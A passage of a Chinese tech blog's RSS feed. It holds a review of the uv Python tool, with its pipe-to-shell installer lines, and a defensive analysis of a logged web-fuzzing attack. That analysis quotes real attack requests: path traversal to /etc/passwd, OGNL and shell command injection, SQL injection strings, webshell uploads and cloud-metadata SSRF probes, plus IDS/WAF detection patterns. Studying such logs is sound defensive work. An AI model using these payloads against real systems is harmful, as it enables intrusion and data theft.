ZIP 檔，安裝時可直接解壓到 site-packages 而不需現場編譯)</li> <li>建立虛擬環境與安裝檔案時會運用 Hard Link 與複製時寫入 (Copy-on-Write) 等技術，降低磁碟 I/O 與空間重複，並以原子方式更新確保一致性。</li> <li>直接以檔案系統底層機制操作管理 venv，避免中間層成本並可提升建立/切換速度，比透過 Python 的 venv 模組更有效率。</li> <li>採用 PubGrub 的 Rust 實作 (pubgrub-rs) 擔任版本求解器，具增量、決定性與偏好自鎖檔版本的策略，在解析過程中可預取相關套件中繼資料，消除網路延遲。</li></ol> <p>整理完 uv 特色讓我熱血沸騰，接著來實際用看看。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig6_638948424619862659.jpg" alt="thumbnail"></p> <h3>安裝 uv</h3> <p>安裝超簡單，macOS/Liunx <code>curl -LsSf https://astral.sh/uv/install.sh | sh</code>、Windows <code>powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"</code> (也可用 winget/scoop ) 都是一行搞定。</p> <p>我在 WSL 測試，安裝速度很快，不到三秒完成。裝完重新登入或 <code>source $HOME/.local/bin/env</code> 即可使用 uv CLI。</p> <h3>安裝 Python</h3> <p>開始前先 <code>uv python install</code> 安裝最新版 Python，只花了 5.5s... 快到我有點不習慣。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638948424621465463.png"></p> <p>註：以上安裝方法只會安裝 python3.13，若要將不帶版號的別名 (python、python3) 指向該版本，可加上參數 <code>uv python install --default</code>。</p> <h3>執行 Python 程式</h3> <p>執行程式不再是用 <code>python &lt;py-file-path&gt; &lt;args...&gt;</code>，要改用 <code>uv run &lt;py-file-path&gt; &lt;args...&gt;</code></p> <pre><code>uv run test.py
+uv run test.py "arg1" "arg2"
+# bash
+echo 'print("hello world!")' | uv run -
+uv run - &lt;&lt;EOF
+print("hello world!")
+EOF
+# cmd
+echo print("hello world!") | uv run -
+# PowerShell
+@"
+print("hello world!")
+"@ | uv run -
+</code></pre> <p>有個小技巧是可以直接把 Python 程式寫成腳本，例如新增一個 greet 文字檔，寫入以下內容再 <code>chmod u+x greet</code>：</p> <pre><code>#!/usr/bin/env -S uv run --script
+print("Hello, world!")
+</code></pre> <p>greet 便可以比照 bash 腳本直接執行，很酷。</p> <h3>下載套件</h3> <p>對於複雜應用，<a href="https://blog.kyomind.tw/pyproject-toml/">pyproject.toml 專案檔</a> 可定義 Python 專案，uv 將依據它下載依賴的套件。對於單一 .py 檔，我們可以透過 --with 參數指定要下載的依賴套件。</p> <pre><code># example.py
+import time
+from rich.progress import track
+for i in track(range(20), description="For example:"):
+time.sleep(0.05)
+# 執行
+uv run --with rich exmaple.py
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638948424623089676.png"></p> <p>另一個更方便的做法是用 --script 在 .py 開頭加入宣告，例如 <code>uv add --script example.py 'requests&lt;3' 'rich'</code>，程式最前方會有一段註刪起來的宣告語法，之後不用加 --with 參數 uv 也會依據這段宣告自動下載安裝依賴的套件：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638948424624769221.png"></p> <p>另外，在宣告區也可指定需要的 Python 版本：</p> <pre><code># /// script
+# requires-python = "&gt;=3.12"
+# dependencies = []
+# ///
+# Use some syntax added in Python 3.12
+type Point = tuple[float, float]
+print(Point)
+</code></pre> <h3>虛擬環境 (venv)</h3> <p>uv 也支援虛擬環境，但做法更先進，它會利用 Hard-Link 取代下載及複製重複的檔案到每個虛擬環境資料夾，節省寶貴空間。</p> <pre><code>uv venv # 用 .venv 資料夾建立虛擬環境
+uv venv --python 3.11 # 指定 Python 版本
+uv pip install ruff # 在虛擬環境安裝套件
+source .venv/bin/activate # 啟用虛擬環境
+# .venv\Scripts\activate # Windows
+deactivate # 退出虛擬環境
+</code></pre> <h3>快如閃電的套件安裝</h3> <p>接下來仔細說說 uv 讓套件安裝部署又快又好的祕密。我對這段格外好奇，便花了點時研究。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638948424626434283.png"><br> 安裝 pandas 及 numpy 只花 51ms!!!</p> <ol><li>Hard Link 重複使用<br> uv 會將 wheel 等套件內容集中放在全域快取目錄 (例如 ~/.cache/uv)，在虛擬環境安裝 pip install 套件時不複製檔案，而是以硬連結把快取中的檔案「連結」到虛擬環境的 site-packages，因此多個環境都共用一份實體資料，不重複下載、不複製資料、不佔磁碟空間。<br> 以 numpy 的 __init__.pyi 為例，用 ls -il 多顯示 inode 編號，可發現 <code>~/uv-lab/.venv/lib64/python3.13/site-packages/numpy/__init__.pyi</code> 與 <code>~/.cache/uv/archive-v0/vLaE7thhKt3kchyCXSCl3/numpy/__init__.pyi</code> 的 inode 編號相同都是 47044，代表這兩個檔案指向同一磁碟位址，實際上只有一份資料。而用 <code>find ~/ -xdev -inum 47044</code> 反查，一樣能證明兩個路徑都指向同一份檔案內容。<br> <img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638948424628103424.png"><br> 註：Hard-Link 限定同一磁碟分割，若虛擬環境與快取位於不同磁碟，uv 將退回複製檔案之傳統做法並提出警示： <img src="Fig6.png"> 延伸閱讀：<a href="https://blog.miniasp.com/post/2025/01/02/symbolic-link-hard-link-directory-junction">理解 Symbolic Link、Hard Link 與 Directory Junction 的差異之處 by 保哥</a></li> <li>原子化部署<br> uv 進行安裝/同步時，能像資料庫 Transaction 一樣，做到要嘛全部成功，要嘛失敗全部復原，不會出現下載一半或複製一半的情況。<br> 其做法是先在臨時位置完成檔案展開與結構寫入，待驗證完成後再以整批移動或替換目標路徑，確保過程中如遇中斷不會留下半成品或破壞既有可用環境。<br> 而這個設計也跟 uv 的平行處理與快取機制有關，由於檔案可能多人多處共用，故要先在隔離的臨時區並行完成解壓、連結與索引更新，再一次切換，有效降低 I/O 衝突及部分安裝的風險，確保使用者不會看到一半已更新、一半未更新的狀況。</li></ol> <p>必須說，這真是精巧的設計，使用者看不到，只會感受到又快又穩定。</p> <h3>結論</h3> <p>不用說，我被圈粉了! 今天起應該就會逐步改用 uv 取代原有的 Python 開發方式。</p> <p>而現在我也已加入推坑行列：uv 真的好好用，不試看看嗎？</p> <p data-slug="uv" data-title-en="Fast Python package and project manager - uv" data-catg="Python" data-fbimg="https://cdn.pixabay.com/photo/2015/09/08/21/02/superbike-930715_960_720.jpg#960#720">Introducing uv: a lightning-fast, Rust-based Python package and environment manager. Installs, manages, and runs projects efficiently, replacing many traditional tools.</p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>前幾天分享 <a href="/blog/pyenv-win-n-wsl/">Windows 與 WSL 的 pyenv 衝突</a>的事，結果臉書跟部落格的留言區，大家排山倒海地強推 uv! (感謝大家推薦，此處就不一一言謝了)</p> <p>這狀況似曾相識，上回是<a href="/blog/k6-load-testing/">介紹完 JMeter 後被網友大推 K6</a>，一試之後果真如沐春風，相見恨晚... 這回我有預感，我也馬上就要愛上 uv 了~</p> <p><a href="https://docs.astral.sh/uv/">uv</a> 是一款由 Astral 團隊用 Rust 語言開發的現代化 Python 套件管理及專案管理工具。</p> <p>題外話：其實光是 Rust 開發這點就叫我心動了 (延伸閱讀：<a href="/blog/rust-in-js-ecosystem/">Rust 程式語言在 JavaScript 生態圈的角色</a>)，Rust 是強大又安全的程式語言，效能趨近 C/C++ 卻有防彈等級的記憶體安全性。但 Rust 的學習曲線偏陡峭，開發時必須與編譯器不斷鬥智鬥勇，需投入可觀時間精力方能上手，具備一定聰慧、決心與毅力才能駕御，特別吸引追求自我實現的開發者，只留給願意爬過天堂路享受特種部隊榮耀的那群人。也因為成為 Rust 開發者條件嚴苛，至今看過的 Rust 作品在效能與品質上都不曾讓人失望，因此讓我對 Rust 開發的軟體特別有好感。</p> <p>uv 的定位與之前學過的 pyenv、pip、venv 有點不同，它不只解決版本管理或套件安裝的單一需求，而是要打造出全方位的解決方案，一次取代 pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv 等眾多工具。uv 整合了套件安裝、依賴管理、虛擬環境管理以及 Python 版本管理等功能，相較於傳統工具，uv 的套件安裝和依賴解析速度加快了 10 到 100 倍，而支援跨平台使用（macOS、Linux、Windows）當然也不在話下。</p> <p>uv 安裝套件之所以能快如閃電的關鍵，源自 Rust 語言的高效率、並行處理與智慧化快取，以及對打包格式與解析流程的低階最佳化。以下簡要說明：</p> <ol><li>Rust 採單一靜態執行檔，比反覆啟動 Python 解譯器快 N 倍，延遲能從數百 ms 降到 µs。</li> <li>下載、解壓與中繼資料擷取採分層並行，比起循序處理能省下超可觀的等待。</li> <li>透過全域快取，uv 會沿用已下載與已建置好的分發檔，在暖快取(之前下載過)情境能加快百倍，冷快取(從未下載過)時也能快 8-10 倍。<br> (註：此點深得我心，每個虛擬環境 pip install 重新下載安裝多複製一份，對時間跟空間都是浪費)</li> <li>針對 wheel 檔，會先讀取中央目錄、檔案表取得 dist-info/metadata，與快取現況比較，只下載短缺部分不需整檔下載，大幅減少網路傳輸量與等待時間。<br> (註：Wheel 檔是 Python 的標準二進位散布格式，是帶有特定命名與中繼資料結構的 ZIP 檔，安裝時可直接解壓到 site-packages 而不需現場編譯)</li> <li>建立虛擬環境與安裝檔案時會運用 Hard Link 與複製時寫入 (Copy-on-Write) 等技術，降低磁碟 I/O 與空間重複，並以原子方式更新確保一致性。</li> <li>直接以檔案系統底層機制操作管理 venv，避免中間層成本並可提升建立/切換速度，比透過 Python 的 venv 模組更有效率。</li> <li>採用 PubGrub 的 Rust 實作 (pubgrub-rs) 擔任版本求解器，具增量、決定性與偏好自鎖檔版本的策略，在解析過程中可預取相關套件中繼資料，消除網路延遲。</li></ol> <p>整理完 uv 特色讓我熱血沸騰，接著來實際用看看。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig6_638948424619862659.jpg" alt="thumbnail"></p> <h3>安裝 uv</h3> <p>安裝超簡單，macOS/Liunx <code>curl -LsSf https://astral.sh/uv/install.sh | sh</code>、Windows <code>powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"</code> (也可用 winget/scoop ) 都是一行搞定。</p> <p>我在 WSL 測試，安裝速度很快，不到三秒完成。裝完重新登入或 <code>source $HOME/.local/bin/env</code> 即可使用 uv CLI。</p> <h3>安裝 Python</h3> <p>開始前先 <code>uv python install</code> 安裝最新版 Python，只花了 5.5s... 快到我有點不習慣。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638948424621465463.png"></p> <p>註：以上安裝方法只會安裝 python3.13，若要將不帶版號的別名 (python、python3) 指向該版本，可加上參數 <code>uv python install --default</code>。</p> <h3>執行 Python 程式</h3> <p>執行程式不再是用 <code>python &lt;py-file-path&gt; &lt;args...&gt;</code>，要改用 <code>uv run &lt;py-file-path&gt; &lt;args...&gt;</code></p> <pre><code>uv run test.py
+uv run test.py "arg1" "arg2"
+# bash
+echo 'print("hello world!")' | uv run -
+uv run - &lt;&lt;EOF
+print("hello world!")
+EOF
+# cmd
+echo print("hello world!") | uv run -
+# PowerShell
+@"
+print("hello world!")
+"@ | uv run -
+</code></pre> <p>有個小技巧是可以直接把 Python 程式寫成腳本，例如新增一個 greet 文字檔，寫入以下內容再 <code>chmod u+x greet</code>：</p> <pre><code>#!/usr/bin/env -S uv run --script
+print("Hello, world!")
+</code></pre> <p>greet 便可以比照 bash 腳本直接執行，很酷。</p> <h3>下載套件</h3> <p>對於複雜應用，<a href="https://blog.kyomind.tw/pyproject-toml/">pyproject.toml 專案檔</a> 可定義 Python 專案，uv 將依據它下載依賴的套件。對於單一 .py 檔，我們可以透過 --with 參數指定要下載的依賴套件。</p> <pre><code># example.py
+import time
+from rich.progress import track
+for i in track(range(20), description="For example:"):
+time.sleep(0.05)
+# 執行
+uv run --with rich exmaple.py
+</code></pre> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638948424623089676.png"></p> <p>另一個更方便的做法是用 --script 在 .py 開頭加入宣告，例如 <code>uv add --script example.py 'requests&lt;3' 'rich'</code>，程式最前方會有一段註刪起來的宣告語法，之後不用加 --with 參數 uv 也會依據這段宣告自動下載安裝依賴的套件：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638948424624769221.png"></p> <p>另外，在宣告區也可指定需要的 Python 版本：</p> <pre><code># /// script
+# requires-python = "&gt;=3.12"
+# dependencies = []
+# ///
+# Use some syntax added in Python 3.12
+type Point = tuple[float, float]
+print(Point)
+</code></pre> <h3>虛擬環境 (venv)</h3> <p>uv 也支援虛擬環境，但做法更先進，它會利用 Hard-Link 取代下載及複製重複的檔案到每個虛擬環境資料夾，節省寶貴空間。</p> <pre><code>uv venv # 用 .venv 資料夾建立虛擬環境
+uv venv --python 3.11 # 指定 Python 版本
+uv pip install ruff # 在虛擬環境安裝套件
+source .venv/bin/activate # 啟用虛擬環境
+# .venv\Scripts\activate # Windows
+deactivate # 退出虛擬環境
+</code></pre> <h3>快如閃電的套件安裝</h3> <p>接下來仔細說說 uv 讓套件安裝部署又快又好的祕密。我對這段格外好奇，便花了點時研究。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638948424626434283.png"><br> 安裝 pandas 及 numpy 只花 51ms!!!</p> <ol><li>Hard Link 重複使用<br> uv 會將 wheel 等套件內容集中放在全域快取目錄 (例如 ~/.cache/uv)，在虛擬環境安裝 pip install 套件時不複製檔案，而是以硬連結把快取中的檔案「連結」到虛擬環境的 site-packages，因此多個環境都共用一份實體資料，不重複下載、不複製資料、不佔磁碟空間。<br> 以 numpy 的 __init__.pyi 為例，用 ls -il 多顯示 inode 編號，可發現 <code>~/uv-lab/.venv/lib64/python3.13/site-packages/numpy/__init__.pyi</code> 與 <code>~/.cache/uv/archive-v0/vLaE7thhKt3kchyCXSCl3/numpy/__init__.pyi</code> 的 inode 編號相同都是 47044，代表這兩個檔案指向同一磁碟位址，實際上只有一份資料。而用 <code>find ~/ -xdev -inum 47044</code> 反查，一樣能證明兩個路徑都指向同一份檔案內容。<br> <img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638948424628103424.png"><br> 註：Hard-Link 限定同一磁碟分割，若虛擬環境與快取位於不同磁碟，uv 將退回複製檔案之傳統做法並提出警示： <img src="Fig6.png"> 延伸閱讀：<a href="https://blog.miniasp.com/post/2025/01/02/symbolic-link-hard-link-directory-junction">理解 Symbolic Link、Hard Link 與 Directory Junction 的差異之處 by 保哥</a></li> <li>原子化部署<br> uv 進行安裝/同步時，能像資料庫 Transaction 一樣，做到要嘛全部成功，要嘛失敗全部復原，不會出現下載一半或複製一半的情況。<br> 其做法是先在臨時位置完成檔案展開與結構寫入，待驗證完成後再以整批移動或替換目標路徑，確保過程中如遇中斷不會留下半成品或破壞既有可用環境。<br> 而這個設計也跟 uv 的平行處理與快取機制有關，由於檔案可能多人多處共用，故要先在隔離的臨時區並行完成解壓、連結與索引更新，再一次切換，有效降低 I/O 衝突及部分安裝的風險，確保使用者不會看到一半已更新、一半未更新的狀況。</li></ol> <p>必須說，這真是精巧的設計，使用者看不到，只會感受到又快又穩定。</p> <h3>結論</h3> <p>不用說，我被圈粉了! 今天起應該就會逐步改用 uv 取代原有的 Python 開發方式。</p> <p>而現在我也已加入推坑行列：uv 真的好好用，不試看看嗎？</p> <p data-slug="uv" data-title-en="Fast Python package and project manager - uv" data-catg="Python" data-fbimg="https://cdn.pixabay.com/photo/2015/09/08/21/02/superbike-930715_960_720.jpg#960#720">Introducing uv: a lightning-fast, Rust-based Python package and environment manager. Installs, manages, and runs projects efficiently, replacing many traditional tools.</p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig6_638948424619862659.jpg"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig6_638948424619862659.jpg" medium="image"/>
+    <pubDate>Tue, 30 Sep 2025 15:20:58 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[Web Fuzzing 攻擊實例分析]]></title>
+    <link>https://blog.darkthread.net/blog/web-fuzzing-attack-case-study/</link>
+    <itunes:title><![CDATA[Web Fuzzing 攻擊實例分析]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>在外吃飯，手機接到<a href="/blog/homebrew-siem-for-openvpn-connection-alert/">土砲 SIEM</a> 傳來一連串警示，顯示有個 IP 正在對某對外網站嘗試各式各樣的無效 URL，研判是惡意機器人正在探索漏洞準備攻擊。(總不會是公益團體在幫人免費做滲透測試吧？)</p> <p>這種事在網路每天都在上演，網站只要 IP 對外就絕對會遇到。攻擊者會放出機器人在 Internet 四處亂槍打鳥，發現網站後把所有想到的漏洞 URL 全部掃一次，反正成本不高，就算 999 個失敗，只要有一個成功就挖到寶了。</p> <p>這種對同一網站遍歷所有漏洞 URL 的手法，有個專有名詞叫 Web Fuzzying (模糊測試) 攻擊，是一種針對 Web 應用程式常見的自動化安全測試與攻擊技術，其原理是大量產生並輸入隨機、半隨機或精心設計的資料至 Web 服務的各種輸入點，觀察應用程式行為，進而發掘潛在的安全漏洞如 SQL Injection、XSS、目錄遍歷、檔案上傳等。攻擊者通常利用 fuzzer 工具如 ffuf、wfuzz、Burp Suite、JBroFuzz 等，使用 HTTP 的 GET/POST 參數進行模糊測試。</p> <p>事後整理 Nginx log，大約知道整起事件是某個 IP 在六分鐘裡對主機發動了 11 萬次 GET/POST (還包含 34 個 PUT 及 9 個 DELETE)：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638947105228697676.png"></p> <p>來源 IP 不例外地在 <a href="/blog/abuseipdb/">AbusedIPDB</a> 已被通報為惡意來源，至此事件應可以「惡意機器人的隨機式無差別攻擊」簽結。</p> <p>不過難得能拿到完整 Web Fuzzing 攻擊樣本，又正好<a href="/blog/copilot-cli-on-wsl/">在玩 Github Copilot CLI</a>，就順手請 Copilot CLI 整理排序得到大約三千條樣本(原始筆數 11 萬筆，但機器人對同一 URL 會用不同 User Agent 各試一次[註]，故有大量重複)，再丟給 NotebookLM、Perplexity、ChatGPT、Claude、Genimi 歸納分析，藉此機增廣見聞，觀摩惡意程式的手法與攻擊武器有哪些，再回推有哪些錯誤千萬不能犯跟如何做好自我保護。<br> 註：許多站台會依 User-Agent 切換行為(例如行動版/桌面版、舊IE兼容分支、App WebView專屬路徑)，不同分支常有不同模板、參數處理或中介層，對同一 URL 用多種UA能觸發更多後端程式碼路徑，提升撞到邏輯缺陷或漏洞的機率。另外一方面，部分服務會把 User-Agent 當作爬蟲辨識或白名單/黑名單條件，例如對特定爬蟲或內部監測 User-Agent 放寬速率限制或回傳更多診斷細節。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638947110463838369.jpg" alt="thumbnail"></p> <p>綜合各家 LLM 的分析結果，我整理成自己版本的筆記，分類說明：</p> <ol><li><h3>路徑遍歷與任意檔案讀取 (Path Traversal / Arbitrary File Read)</h3> <p>這是非常常見的攻擊類型，攻擊者會嘗試用 ../ 找上層目錄，試圖拿到網站目錄範圍外的系統敏感檔案。<br> 攻擊者主要會嘗試以 ../、百分比編碼、多次編碼或混合斜線、NULL-byte、Unicode 等技巧來繞過過濾，例如：%2e%2e%2f、%252e%252e%252f(雙重編碼) 並混合使用不同分隔符號(例如：../、..\、..%5c)，試圖取得系統敏感檔案，例如 /etc/passwd、windows/win.ini、wp-config.php、.env、SSH 私鑰 (.ssh/id_rsa)、AWS 憑證 (.aws/credentials)、docker/ssh/credentials... 等等，Java 網站常見的目標則有 WEB-INF/web.xml 或 WEB-INF/weblogic.xml，其中包含 Java 應用程式的結構、Servlet 配置和潛在的敏感資訊。<br> 樣本中遍歷深度最多達到 18 層，其中 5 層遍歷最為常見。以下是一些範例：</p> <ul><li>基本遍歷： <code>GET /../../../../../../etc/passwd</code></li> <li>用 URL 編碼繞過： <code>GET /api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252fpasswd</code> 這裡的 %252E 是 %2E 的雙重編碼，. 的 URL 編碼是 %2e，/ 是 %2f。<br> 攻擊者利用多層編碼來繞過簡單的資安防護規則。</li> <li>參數注入： <code>GET /ACSServer/WebServlet?act=getMapImg_acs2&amp;filename=../../../../../../../etc/passwd</code> 攻擊者將遍歷路徑作為 filename 參數的值傳入，試圖讓後端程式讀取並返回任意檔案。</li> <li>針對特定平台： <code>GET /public/plugins/grafana-clock-panel/../../../../../conf/defaults.ini</code> 這個請求明確針對 Grafana 平台，嘗試利用插件路徑進行路徑遍歷，讀取 Grafana 的預設設定檔。</li></ul> </li> <li><h3>Remote Code Execution（RCE）或 OGNL injection（特別針對 Apache Struts）</h3> <p>利用框架內的表達式語言或遠端範本注入及執行系統命令。例如樣本中就有大量 index.action?...%23context...Runtime.getRuntime().exec(...) 的 Payload。(說著說著就出現了 <a href="/blog/whats-payload/">【打破砂鍋】資訊、資安常在說的 Payload 到底是什麼?</a>)</p> <ul><li>利用 OGNL (Object-Graph Navigation Library) 表達式注入漏洞來執行命令 - <code>GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29...%7D/actionChain1.action</code> 透過 OGNL 表達式呼叫 Java 的 Runtime.getRuntime().exec() 方法來執行 cat /etc/passwd 命令，並試圖將結果輸出到網頁上，另一個變體是執行 whoami。</li> <li>利用 PHP 函式漏洞或特性（如 system()、shell_exec()）執行命令 - <code>GET /__debugging_center_utils___.php?log=;echo%20cekurzpqyhikfdufobsffhkblpjobpti%20|%20id</code> 攻擊者在 log 參數後方用分號 ; 結束前一個指令，然後注入 id 或 ipconfig 命令，並將結果輸出。</li> <li>許多舊式或嵌入式設備的 CGI 程式存在漏洞，允許直接將命令注入到 URL 參數中，例如：<br> <code>GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=...cat${IFS}/etc/passwd</code> 利用 ShellShock (Bash 漏洞) 嘗試將命令注入到環境變數中執行。<br> <code>GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&amp;group=%27;id;%27</code> 在 group 參數中注入 ;id; 命令，試圖利用應用程式拼接系統命令時的漏洞來執行 id。</li></ul> </li> <li><h3>SQL 注入 (SQL Injection, SQLi)</h3> <p>SQL Injection 是老梗中的老梗，但仍是最受駭客歡迎兼最常出現的漏洞，歷久不衰。攻擊者會在輸入參數插入惡意 SQL 程式碼，若程式犯下低級錯誤 - 用參數組裝 SQL 語法，就能對後端資料庫執行非預期的任意操作，常用於竊取資料、繞過認證、拖延系統反應，破壞資料庫、植入木馬... 等等，危險度破表。</p> <ul><li>攻擊對象不限資料庫不限平台，由樣本發現攻擊者對 MySQL (md5())、SQL Server (<code>substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5',...)))</code>)、PostgreSQL (<code>pg_sleep()</code>) 都做了嘗試。另外也有大量大量 SQLi 攻擊都針對 WordPress 的 rest_route API 或各種插件的參數。</li> <li>時間盲注攻擊(Time-based Blind Injection) - <code>GET /?rest_route=/lms/stm-lms/order/items&amp;author_id=1&amp;user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071</code>，注入 SLEEP(6) 語句，如果伺服器回應慢了 6 秒，可驗證此處存在 SQL 注入漏洞。</li> <li>聯合查詢 (UNION-based/MD5 Fingerprint) - <code>GET /admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+</code> 攻擊者使用 UNION SELECT 語句，試圖將 md5('999999999') (b7a5779c9384b6f13a07ef41c11e74f1) 塞到 HTML 回應，若在 HTML 發現該內容即代表有漏洞。</li> <li>錯誤注入 (Error-based) - <code>GET /a/sys/user/resetPassword?mobile=...%27and%20(updatexml(1,concat(0x7e,(select%20md5(999999999)),0x7e),1))%23</code> 故意在 updatexml 函式觸發資料庫錯誤，並將 md5() 包含在錯誤訊息中回傳，若出現就代表有 SQLi。</li></ul> </li> <li><h3>敏感資訊與路徑洩漏 (Sensitive Information &amp; Path Disclosure)</h3> <p>目的在發現伺服器上未受保護的敏感檔案、備份檔、設定檔或管理介面，攻擊者常透過字典檔暴力猜測常見的路徑和檔名。</p> <ul><li>樣本中有大量請求針對 WordPress wp-config.php 及其各種備份形式（如 wp-config.php.bak, wp-config.old 等）的嘗試，wp-admin/ 和 wp-login.php 也是常見目標。</li> <li>通用的 Web 伺服器目標包含 .env、.git/config、.svn/entries 等版本控制系統的殘留檔案，以及各種 config.json、database.yml 等設定檔。</li> <li>針對管理後台與 API 端點的攻擊 - 例如：大量請求嘗試訪問 /admin/、/login、/api/users 等常見的管理介面或 API 路徑。</li> <li>雲端平台 Metadata，如 <code>GET http://169.254.169.254/latest/meta-data/</code> 嘗試訪問 AWS EC2 的 Metadata 服務，試圖利用 SSRF (Server-Side Request Forgery) 漏洞來竊取雲端主機的臨時憑證。樣本中也發有有針對其他雲平台（如 Google Cloud, Azure, Alibaba Cloud）Metadata 資料服務的嘗試。</li></ul> </li> <li><h3>檔案上傳漏洞 (File Upload Vulnerabilities)</h3> <p>攻擊者試圖尋找允許上傳檔案的功能，並上傳惡意的 Web Shell (通常是 PHP 或 JSP 檔案)，以獲得伺服器的控制權。</p> <ul><li>尋找 PHP upload.php 或類似功能的端點，直接上傳 Webshell <code>POST /Upload/upload_file.php?l=test</code>，POST 主體很可能包含惡意的 PHP 程式碼，隨後再嘗試讀取上傳檔名(如 <code>GET /Upload/test/33GXVIW1wGVkjgrvdjv48KeQTAf.php</code>)確認是否成功。</li> <li>嘗試在 WordPress admin-ajax 建立/寫入 PHP，如 <code>POST /wp-admin/admin-ajax.php?+config-create+/&amp;/&lt;?=base64_decode($_GET[0])?&gt;+/tmp/33GXVLqZmI04wSu...php</code> 之後再用 GET 驗證。</li> <li><code>GET /Uploads/33GXVFaEfezRt7gMXCYpyePTpII.php7</code> 包含繞過檔案類型限制的手法，使用 .php7 這樣的非標準副檔名可繞過僅檢查 .php 副檔名的上傳限制，如果伺服器設定不當，仍可能將其作為 PHP 腳本執行。</li> <li>尋找允許上傳 .jsp 檔案的漏洞 - 針對特定應用漏洞： <code>POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/KCFy2ZpF.jsp</code> 此請求利用了 FineReport 的一個漏洞，透過目錄遍歷將任意內容（Webshell）寫入到一個 .jsp 檔案中，從而實現遠端控制。</li></ul> </li></ol> <h3>被瞄準的應用程式 / 平台</h3> <p>瞄準的 CMS、Web 應用、框架和語言包羅萬象，許多我聽都沒聽過</p> <ul><li>WordPress（wp-admin、admin-ajax、wp-json、uploads、wp-file-manager、wp-time-capsule） —— 大量 plugin 路徑與 uploads/webshell 掃描。</li> <li>Confluence：如 /pages/createpage-entervariables.action。</li> <li>Joomla/PrestaShop：外掛上傳如 com_gmapfp、modules/appagebuilder。</li> <li>Pandora FMS：如 /pandora_console/ajax.php。</li> <li>Apache Struts / Java Webapps（index.action, WEB-INF, weblogic.xml） —— OGNL RCE payload 明顯針對 Struts 類漏洞。</li> <li>Nacos / Spring Boot actuator / Airflow / SolarWinds / Geoserver / phpMyAdmin / Nagios / OpenAM / Minio —— 掃描管理 API / 未受保護的 endpoints。</li> <li>各種 PHP 應用與 plugin（elfinder、uploadify、file-manager、simple-file-list、wp-file-manager 等） —— 上傳漏洞和不當的檔案處理。</li> <li>.NET/ASP：如 human.aspx、WidgetHandler.ashx。</li></ul> <p>一些企業或管理工具軟體</p> <ul><li>Nacos：如 /nacos/v1/auth/users/ (配置管理)。</li> <li>Seeyon OA：如 /seeyon/thirdpartyController.do (中國 OA 系統)。</li> <li>Oracle E-Business Suite：如 /OA_HTML/ibeCAcpSSOReg.jsp。</li> <li>SolarWinds Orion：如 /SolarWinds/InformationService/v3/Json/Query。</li></ul> <p>路由器/裝置/資安相關產品</p> <ul><li>Cisco：如 /+CSCOU+/../+CSCOE+/files/file_list.json。</li> <li>Fortinet：如 /ssl-vpn/hipreport.esp。</li> <li>Zabbix/Nagios：如 /zabbix/index.php、nagiosxi/login.php。</li> <li>iDRAC/Supermicro：如 /redfish/v1/SessionService/Sessions/。</li></ul> <p>其他平台</p> <ul><li>MinIO：如 /minio/bootstrap/v1/verify (物件儲存)。</li> <li>GeoServer：如 /geoserver/wms。</li> <li>Docker/Kubernetes：如 /kubepi/api/v1/users。</li></ul> <h3>攻擊者常用的自動化與偵測特徵</h3> <p>由樣本的 Pattern，可整理出一些明顯特徵，這部分可做為設計 IDS 或 WAF 規則的參考：</p> <ul><li>大量同類 payload 的快速連續請求（fuzzing）— 檢測同一來源在短時間大量 ..、%00、/etc/passwd、wp-admin/admin-ajax.php?action= 等請求。</li> <li>對 Known paths 的字典掃描（.env、wp-config.php、jwt/private.pem、private.key 等）。</li> <li>Time-based SQLi 的慢查詢（SLEEP payload）或回顯試探（md5(999999999)）。</li></ul> <p data-slug="web-fuzzing-attack-case-study" data-fbimg="https://i.postimg.cc/2yCyTyYn/image.png#1280#720"> </p>]]>
+    </itunes:summary>
+    <description>
